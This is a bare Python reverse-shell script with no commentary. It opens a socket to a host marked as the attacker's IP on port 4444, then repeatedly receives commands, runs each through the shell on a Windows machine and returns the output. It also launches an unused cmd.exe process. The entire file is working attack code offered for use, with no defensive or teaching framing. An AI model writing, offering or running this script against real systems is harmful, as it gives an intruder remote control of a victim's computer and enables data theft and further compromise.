import socket
import subprocess
import os

host = "192.168.1.100" # Replace with your attacker's IP
port = 4444           

s = socket.socket()
s.connect((host, port))

proc = subprocess.Popen(
    ["cmd.exe"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    shell=True
)

while True:
    s.send(b"\n> ")
    cmd = s.recv(1024).decode("utf-8").strip()
    if cmd.lower() == "exit":
        break

    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    output = result.stdout + result.stderr
    if not output:
        output = "[No output]"

    s.send(output.encode("utf-8"))

s.close()
proc.terminate()
